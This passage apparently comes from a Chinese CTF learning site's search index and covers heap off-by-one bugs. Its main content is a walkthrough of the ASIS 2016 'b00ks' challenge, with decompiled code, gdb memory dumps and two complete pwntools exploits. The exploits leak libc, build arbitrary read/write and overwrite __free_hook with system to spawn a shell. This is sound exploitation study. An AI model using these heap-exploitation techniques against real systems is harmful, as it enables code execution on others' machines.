\u5927\u5c0f\u81ea\u5b9a\u4e14\u65e0\u9650\u5236\u5927\u5c0f\u3002 \u8be6\u7ec6\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a\uff08\u4ece my_create \u51fd\u6570\u4e2d\u7ed3\u5c3e\u53ef\u63a8\u51fa\u7ed3\u6784\u4f53\uff0c\u4e0b\u9762\u662f\u7b80\u5316\u8fc7\u7684\uff09 struct book { int id; //8bit char *book_name; //8bit char *book_description; //8bit int size; //8bit } \u7ed3\u6784\u4f53\u7533\u8bf7\u597d\u540e\uff0c\u540c\u4e00\u653e\u7f6e\u5230 off_202010 \u5217\u8868\u4e2d\u7ba1\u7406\u3002 *((_QWORD *)off_202010 + v2) = book; \u6f0f\u6d1e\u51fd\u6570 \u7a0b\u5e8f\u7f16\u5199\u5b9a\u4e49\u7684\u8bfb\u5165\u51fd\u6570 sub_9F5() \u5b58\u5728 null byte off-by-one \uff08\u540e\u6587\u79f0\u8be5\u51fd\u6570\u4e3a my_read() \uff09\u3002\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\u6e90\u7801\uff0c\u6ce8\u610f\u7559\u610f\u6700\u540e\u4e00\u6b21\u5faa\u73af\u7684\u8fb9\u754c\u8f93\u5165\u3002 signed __int64 __fastcall my_read(_BYTE *a1, int a2) { int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 <= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) //\u6ca1\u6709\u6b63\u786e\u5904\u7406\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5199\u5165\u4f4d\u7f6e break; } *buf = 0; //\u6f0f\u6d1e\u70b9 return 0LL; } \u5bf9\u6bd4\u4e00\u4e0b\u5176\u4ed6\u8c03\u7528 my_read \u51fd\u6570\u7684\u53c2\u6570\u5c31\u77e5\u9053\u4e3a\u4ec0\u4e48\u8f93\u5165 author name \u4f1a\u51fa\u73b0 off-b-null \uff1a description \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 name \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 \u4f46\u662f my_name \u53ef\u4ee5\u653e 32 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a 32 \uff0c\u6ca1\u6709\u4e3a\u6700\u540e\u7ed3\u675f\u7b26\u9884\u7559\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u601d\u8def \u6ea2\u51fa\u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\uff1f \u6211\u4eec\u5148\u770b\u770b author name \u6ea2\u51fa\u7684 \\x00 \u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\u3002\u5148\u4e00\u6bb5\u8c03\u8bd5\u7684 exp \uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5728\u811a\u672c\u4e2d\uff0c\u8f93\u5165 author name \u4e3a \"a\"*0x32 \uff0c\u5728\u7533\u8bf7\u4e00\u4e2a book \uff0c\u6700\u540e\u624d\u8c03\u7528 gdb \uff0c\u7a0b\u5e8f\u6253\u5f00 PIE \u4fdd\u62a4\u6211\u4eec\u5c31\u6253\u4e00\u4e2a\u65ad\u70b9\uff0c\u65b9\u4fbf\u8ba1\u7b97\u504f\u79fb\u627e\u5230 name \uff1a gdb.attach(p,\"b *$rebase(0x0B94)\") \u3002 \u5148\u627e\u5230 name \u548c chunk_list \u771f\u5b9e\u5730\u5740\uff1a chunk_list \u5728\u4f4e\u5730\u5740\uff0c\u4ece\u5b83\u5f00\u59cb\u67e5\u5185\u5b58\uff1a \u53ef\u4ee5\u770b\u5230\u5b9e\u9645\u4e0a\u4e0d\u662f\u4ece chunk_list \u5f00\u59cb\u5b58\u653e\u7ed3\u6784\u4f53\u6307\u9488\uff0c\u800c\u662f\u5b9a\u5411\u5230\u4e86 0x555555756060 \uff0c\u4ece\u8fd9\u91cc\u5f00\u59cb\u8bb0\u5f55\u7ed3\u6784\u4f53\u6307\u9488\uff08\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e24\u4e2a book \uff09\u3002\u7136\u540e\u6211\u4eec\u89c2\u5bdf name \uff0c\u5728\u7ed3\u6784\u4f53\u6307\u9488\u524d\u9762\uff0cname \u6ea2\u51fa\u7684\u4f1a\u8986\u76d6\u6389 book1 \u7ed3\u6784\u4f53\u6307\u9488\u3002\u6211\u4eec\u7ed9\u4e00\u6b21 name \u770b\u770b\u6548\u679c\uff1a \u8fd9\u6837\u6ea2\u51fa\u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u53bb 0x0000555555758300 \u627e book1 \u8d44\u6599\uff0c\u800c\u4e0d\u662f 0x0000555555758330 \u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u80fd\u591f\u5728 0x0000555555758300 \u4f2a\u9020\u4e00\u4e2a book \u7ed3\u6784\u4f53\uff0c\u5c31\u80fd\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u8f93\u51fa&\u4fee\u6539\u529f\u80fd\uff0c\u5b9e\u73b0\u4efb\u610f\u8bfb\u5199\u3002\u7a0b\u5e8f\u662f Full RELRO \uff0c\u5c31\u5199 hook \u3002\u5927\u6982\u601d\u8def\u5c31\u662f\u8fd9\u4e48\u4e2a\u601d\u8def\uff0c\u653b\u51fb\u6d41\u7a0b\uff1a author name \u586b\u5145 0x20 bit\uff0c\u8986\u76d6\u7ed3\u675f\u7b26 creat boo1 && book2 print book1 info \u4ece author name \u6cc4\u9732 book1 \u7ed3\u6784\u4f53\u5730\u5740 edit book1 description \u586b\u5165 payload\uff0c\u6784\u5efa fake book1 \u7ed3\u6784\u4f53 change author name \u8986\u76d6 book1 \u6307\u9488\uff0c\u8ba9\u5176\u6307\u5411 fake book1 print book1 info \u6cc4\u9732 book2 \u5730\u5740\uff08mmap\u5730\u5740\uff09 edit book1 \u6765\u4fee\u6539 book2 *description \u6307\u5411 free_hook edit book2 \u4fee\u6539 free_hook \u4e3a one_gadget \u6cc4\u6f0f book1 \u7ed3\u6784\u4f53\u5730\u5740 \u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684 my_read \u51fd\u6570\u5b58\u5728 null byte off-by-one \uff0c\u4e8b\u5b9e\u4e0a my_read \u8bfb\u5165\u7684\u7ed3\u675f\u7b26 '\\x00' \u662f\u5199\u5165\u5230 0x555555756060 \u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f53 0x555555756060\uff5e0x555555756068 \u5199\u5165 book \u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26 '\\x00' \uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370 author name \u5c31\u53ef\u4ee5\u83b7\u5f97 pointer array \u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002 0x555555756040: 0x4141414141414141 0x4141414141414141 0x555555756050: 0x4141414141414141 0x4141414141414141 <== author name 0x555555756060: 0x0000555555758330 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728 author name \u4e2d\u9700\u8981\u8f93\u5165 32 \u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efa book1 \uff0c\u8fd9\u4e2a book1 \u7684\u6307\u9488\u4f1a\u8986\u76d6 author name \u4e2d\u6700\u540e\u7684 NULL \u5b57\u8282\uff0c\u4f7f\u5f97\u8be5\u6307\u9488\u4e0e author name \u76f4\u63a5\u8fde\u63a5\uff0c\u8fd9\u6837\u8f93\u51fa author name \u5219\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u5806\u6307\u9488\u3002 createname(\"A\"*32) createbook(128,\"a\"*8,32,\"b\"*8) createbook(0x21000,\"/bin/sh\\x00\",0x21000,\"d\"*8) # getshell\u7528\u968f\u5e26\u4e5f\u5148\u7533\u8bf7\uff0c\u5bf9\u672c\u6b65\u6ca1\u6709\u5f71\u54cd book_id_1,book_name,book_des,book_author=printbook(1) book1_addr=u64(book_author[32:32+6].ljust(8,'\\x00')) \u4f2a\u9020\u7ed3\u6784\u4f53 \u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cd change \u529f\u80fd\uff0c change \u529f\u80fd\u7528\u4e8e\u4fee\u6539 author name \uff0c\u6240\u4ee5\u901a\u8fc7 change \u53ef\u4ee5\u5199\u5165 author name \uff0c\u5229\u7528 off-by-one \u8986\u76d6 book1 \u7684\u4f4e\u5b57\u8282\u3002 \u8986\u76d6\u6389 book1 \u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411 book1 \u7684 description [^4]\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86 edit \u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 description \u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728 description \u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2a book \u7ed3\u6784\uff0c\u8fd9\u4e2a book \u7ed3\u6784\u7684 description \u548c name \u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002 [^4]:\u4e3a\u5565\u521a\u521a\u597d\u5c31\u662f\u5728 book1 desc \u91cc\u9762\uff1f\u901a\u8fc7\u8c03\u8bd5\u5457\u3002\u6ce8\u610f\u5728 Ubuntu 16 \u8fd9\u91cc\u65e0\u6cd5\u5b9e\u73b0\u6307\u5411 book1 desc \uff0c\u8bf7\u770b\u7ed3\u5c3e\u8865\u5145 \u8fd9\u91cc\u5728 description \u4e2d\u4f2a\u9020\u4e86 book \uff0c\u4f7f\u7528\u7684\u6570\u636e\u662f p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) \u3002 \u5176\u4e2d book1_addr+0x38 \u6307\u5411 book2 \u7684 book_name \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff1bbook1_addr+0x40 \u6307\u5411 book2 \u7684 book_desc \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 book2 \u6307\u9488\u503c\u3002 \u8fd9\u6837\u5c31\u662f\u5b9e\u73b0 edit book1 \u4fee\u6539 book2 \u6307\u9488\u5730\u5740\uff0cedit book2 \u4fee\u6539\u4efb\u610f\u5730\u5740 log.success(\"book2_name_addr:\"+hex(book1_addr+0x38)) log.success(\"book2_desc_addr:\"+hex(book1_addr+0x40)) payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) editbook(book_id_1,payload) # write fakechunk \u6cc4\u9732 libc \u5730\u5740 \u524d\u9762\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199 got \u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199 __malloc_hook \u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542f PIE \u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0f libc \u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002 \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2a book \u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5 mmap \u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662f brk \u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662f mmap \u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528 mmap \u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3a mmap \u5206\u914d\u7684\u5185\u5b58\u4e0e libc \u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51fa libc \u7684\u57fa\u5730\u5740\u3002 pwndbg> x /4gx 0x0000555555758360 0x555555758360: 0x0000000000000002 0x00007ffff7fbc010 0x555555758370: 0x00007ffff7f9a010 0x0000000000021000 pwndbg> vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555556000 r-xp 2000 0 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555755000 0x555555756000 r--p 1000 1000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555756000 0x555555757000 rw-p 1000 2000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555757000 0x555555778000 rw-p 21000 0 [heap] 0x7ffff79e4000 0x7ffff7bcb000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7f9a000 0x7ffff7fe0000 rw-p 46000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack] 0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] \u5199\u5165 __free_hook \u53ef\u4ee5\u5199\u5165 onegadget \u4e5f\u53ef\u4ee5\u662f system \uff0c\u5982\u679c\u662f system \uff0c\u9700\u8981 free \u7684 book_name \u662f /bin/sh \u6765\u4f20\u5165\u53c2\u6570\u3002 exploit #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe\u3001CTF-WIKI # @Email : skye231@foxmail.com # @File : b00ks.py from pwn import * context.log_level=\"debug\" p=process(\"./b00ks\") elf=ELF(\"b00ks\") libc=ELF(\"./libc.so.6\") def createbook(name_size,name,des_size,des): p.readuntil(\"> \") p.sendline(\"1\") p.readuntil(\": \") p.sendline(str(name_size)) p.readuntil(\": \") p.sendline(name) p.readuntil(\": \") p.sendline(str(des_size)) p.readuntil(\": \") p.sendline(des) def printbook(id): p.readuntil(\"> \") p.sendline(\"4\") p.readuntil(\": \") for i in range(id): book_id=int(p.readline()[:-1]) p.readuntil(\": \") book_name=p.readline()[:-1] p.readuntil(\": \") book_des=p.readline()[:-1] p.readuntil(\": \") book_author=p.readline()[:-1] return book_id,book_name,book_des,book_author def createname(name): p.readuntil(\"name: \") p.sendline(name) def changename(name): p.readuntil(\"> \") p.sendline(\"5\") p.readuntil(\": \") p.sendline(name) def editbook(book_id,new_des): p.readuntil(\"> \") p.sendline(\"3\") p.readuntil(\": \") p.writeline(str(book_id)) p.readuntil(\": \") p.sendline(new_des) def deletebook(book_id): p.readuntil(\"> \") p.sendline(\"2\") p.readuntil(\": \") p.sendline(str(book_id)) # leak chunk1_stuct addr createname(\"A\"*32) #gdb.attach(p,\"b *$rebase(0x0B94)\") createbook(128,\"a\"*8,32,\"b\"*8) createbook(0x21000,\"/bin/sh\\x00\",0x21000,\"d\"*8) book_id_1,book_name,book_des,book_author=printbook(1) book1_addr=u64(book_author[32:32+6].ljust(8,'\\x00')) log.success(\"book1_address:\"+hex(book1_addr)) # set fake chunk log.success(\"book2_name_addr:\"+hex(book1_addr+0x38)) log.success(\"book2_desc_addr:\"+hex(book1_addr+0x40)) payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) editbook(book_id_1,payload) # overwrite chunk1_stuct addr 2 fake chunk changename(\"A\"*32) book_id_1,book_name,book_des,book_author=printbook(1) book2_name_addr=u64(book_name.ljust(8,\"\\x00\")) book2_des_addr=u64(book_des.ljust(8,\"\\x00\")) log.success(\"book2 name addr:\"+hex(book2_name_addr)) log.success(\"book2 des addr:\"+hex(book2_des_addr)) libc_base=book2_des_addr-0x5b6010#0x5b9010 log.success(\"libc base:\"+hex(libc_base)) free_hook=libc_base+libc.symbols[\"__free_hook\"] log.success(\"free_hook:\"+hex(free_hook)) system = libc_base+libc.symbols[\"system\"] ''' ne_gadget=libc_base+0x4f3c2 #0x4f2c5 0x10a38c 0x4f322 log.success(\"one_gadget:\"+hex(one_gadget)) ''' # overwrite free_hook # set chunk2_desc 2 free_hook editbook(1,p64(free_hook)) # overwrite free_hook 2 system editbook(2,p64(system)) deletebook(2) p.interactive() \u7b80\u6d01\u65b9\u6848 \u5728\u4efb\u610f\u8bfb\u5199\u4e4b\u540e\uff0c\u53e6\u4e00\u79cd\u627e\u5230 libc \u7684\u65b9\u6848\u5176\u5b9e\u662f\u53ef\u4ee5\u5728\u8fdb\u884c\u4efb\u610f\u8bfb\u5199\u4e4b\u524d\u9996\u5148\u9020\u6210 libc \u5730\u5740\u88ab\u5199\u5728\u5806\u4e0a\uff0c\u4e4b\u540e\u4efb\u610f\u8bfb\u5c06\u5176\u8bfb\u51fa\u6765\u5373\u53ef\u3002 \u5176\u4e2d\u4e3a\u627e\u5230 libc \u6240\u5728\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 gdb \u8c03\u8bd5\uff0c\u67e5\u770b\u5177\u4f53 libc \u5730\u5740\u5728\u5806\u4e0a\u7684\u4f4d\u7f6e\u5373\u53ef\uff0c\u4e0d\u7528\u8fdb\u884c\u523b\u610f\u8ba1\u7b97\u3002 exp \u5982\u4e0b\uff1a #! /usr/bin/env python2 # -*- coding: utf-8 -*- # vim:fenc=utf-8 import sys import os import os.path from pwn import * context(os='linux', arch='amd64', log_level='debug') if len(sys.argv) > 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT) else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH) def cmd(choice): p.recvuntil('> ') p.sendline(str(choice)) def create(book_size, book_name, desc_size, desc): cmd(1) p.recvuntil(': ') p.sendline(str(book_size)) p.recvuntil(': ') if len(book_name) == book_size: p.send(book_name) else: p.sendline(book_name) p.recvuntil(': ') p.sendline(str(desc_size)) p.recvuntil(': ') if len(desc) == desc_size: p.send(desc) else: p.sendline(desc) def remove(idx): cmd(2) p.recvuntil(': ') p.sendline(str(idx)) def edit(idx, desc): cmd(3) p.recvuntil(': ') p.sendline(str(idx)) p.recvuntil(': ') p.send(desc) def author_name(author): cmd(5) p.recvuntil(': ') p.send(author) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def main(): # Your exploit script goes here # leak heap address p.recvuntil('name: ') p.sendline('x' * (0x20 - 5) + 'leak:') create(0x20, 'tmp a', 0x20, 'b') # 1 cmd(4) p.recvuntil('Author: ') p.recvuntil('leak:') heap_leak = u64(p.recvline().strip().ljust(8, '\\x00')) p.info('heap leak @ 0x%x' % heap_leak) heap_base = heap_leak - 0x1080 create(0x20, 'buf 1', 0x20, 'desc buf') # 2 create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3 remove(2) remove(3) ptr = heap_base + 0x1180 payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + '\\x00' * 0xe0 + p64(0x100) create(0x20, 'name', 0x108, 'overflow') # 4 create(0x20, 'name', 0x100 - 0x10, 'target') # 5 create(0x20, '/bin/sh\\x00', 0x200, 'to arbitrary read write') # 6 edit(4, payload) # overflow remove(5) # unlink edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\\n') def write_to(addr, content, size): edit(4, p64(addr) + p64(size + 0x100) + '\\n') edit(6, content + '\\n') def read_at(addr): edit(4, p64(addr) + '\\n') cmd(4) p.recvuntil('Description: ') p.recvuntil('Description: ') p.recvuntil('Description: ') content = p.recvline()[:-1] p.info(content) return content libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\\x00')) - 0x3c4b78 p.info('libc leak @ 0x%x' % libc_leak) write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10) remove(6) p.interactive() if __name__ == '__main__': main() \u5728Ubuntu16\u4e0b\u51fa\u73b0\u60c5\u51b5 book1 \u7ed3\u6784\u4f53\u8986\u76d6\u540e\u6307\u5411\u7684\u5730\u5740\u975e\u5e38\u4f4e\uff0c\u6307\u5411\u7684\u5730\u5740\u53d8\u6210\u662f\u5728\u4e00\u4e2a\u83ab\u540d\u5176\u5999\u7684 chunk \u91cc\u9762\u65e0\u6cd5\u5b9e\u73b0\u4f2a\u9020\u3002","title":"\u5806\u57fa\u7840Off-By-One"},{"location":"glibc-heap/off_by_one/#off-by-one","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u5806\u4e2d\u7684 Off-By-One"},{"location":"glibc-heap/off_by_one/#_1","text":"\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002","title":"\u4ecb\u7ecd"},{"location":"glibc-heap/off_by_one/#off-by-one_1","text":"off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef\uff08\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1\uff09\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002 \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8e Linux \u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002 \u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808[^1]\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a\uff08heap based\uff09 \u7684 off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002 [^1]:\u6700\u7b80\u5355\u7684\u662f\u5c31\u662f\u5229\u7528 off-by-one \u6cc4\u9732 Canary \u7684\u503c","title":"off-by-one \u6f0f\u6d1e\u539f\u7406"},{"location":"glibc-heap/off_by_one/#off-by-one_2","text":"\u6ea2\u51fa\u5b57\u8282\u4e3a\u53ef\u63a7\u5236\u4efb\u610f\u5b57\u8282 \uff1a\u901a\u8fc7\u4fee\u6539\u5927\u5c0f\u9020\u6210\u5757\u7ed3\u6784\u4e4b\u95f4\u51fa\u73b0\u91cd\u53e0\uff0c\u4ece\u800c\u6cc4\u9732\u5176\u4ed6\u5757\u6570\u636e\uff0c\u6216\u662f\u8986\u76d6\u5176\u4ed6\u5757\u6570\u636e\u3002 \u4e5f\u53ef\u4f7f\u7528 NULL \u5b57\u8282\u6ea2\u51fa\u7684\u65b9\u6cd5 \u6ea2\u51fa\u5b57\u8282\u4e3a NULL \u5b57\u8282 \uff1a\u5728 size \u4e3a 0x100 \u7684\u65f6\u5019\uff0c\u6ea2\u51fa NULL \u5b57\u8282\u53ef\u4ee5\u4f7f\u5f97 prev_in_use \u4f4d\u88ab\u6e05\uff0c\u8fd9\u6837\u524d\u5757\u4f1a\u88ab\u8ba4\u4e3a\u662f free \u5757[^2]\u3002 \u8fd9\u65f6\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 unlink \u65b9\u6cd5\uff08\u89c1 unlink \u90e8\u5206\uff09\u8fdb\u884c\u5904\u7406\u3002 \u53e6\u5916\uff0c\u8fd9\u65f6 prev_size \u57df\u5c31\u4f1a\u542f\u7528\uff0c\u5c31\u53ef\u4ee5\u4f2a\u9020 prev_size \uff0c\u4ece\u800c\u9020\u6210\u5757\u4e4b\u95f4\u53d1\u751f\u91cd\u53e0\u3002\u6b64\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e unlink \u7684\u65f6\u5019\u6ca1\u6709\u68c0\u67e5\u6309\u7167 prev_size \u627e\u5230\u7684\u5757\u7684\u5927\u5c0f\u4e0e prev_size \u662f\u5426\u4e00\u81f4\uff08libc 2.28 \u4e4b\u524d\uff09\u3002 [^2]:\u4e3e\u4e2a\u5229\u7528\u4e00\u4e2a\u88ab\u5206\u914d\u7684 chunk size \u4e3a 0x101 \uff0c\u8fd9\u662f prev_in_use \u6807\u8bb0\u8fd9\u4e2a chunk \u662f\u88ab\u4f7f\u7528\u72b6\u6001\uff0c\u5982\u679c\u5f53\u6211\u4eec off-by-null \u5c06size \u8986\u76d6\u4e3a 0x100 \uff0c\u90a3\u4e48\u8fd9\u4e2a chunk \u5c31\u88ab\u8ba4\u4e3a\u662f \u7a7a\u95f2\u72b6\u6001 \u6700\u65b0\u7248\u672c\u4ee3\u7801\u4e2d\uff0c\u5df2\u52a0\u5165\u9488\u5bf9 2 \u4e2d\u540e\u4e00\u79cd\u65b9\u6cd5\u7684 check \uff0c\u4f46\u662f\u5728 2.28 \u524d\u5e76\u6ca1\u6709\u8be5 check \u3002 /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* 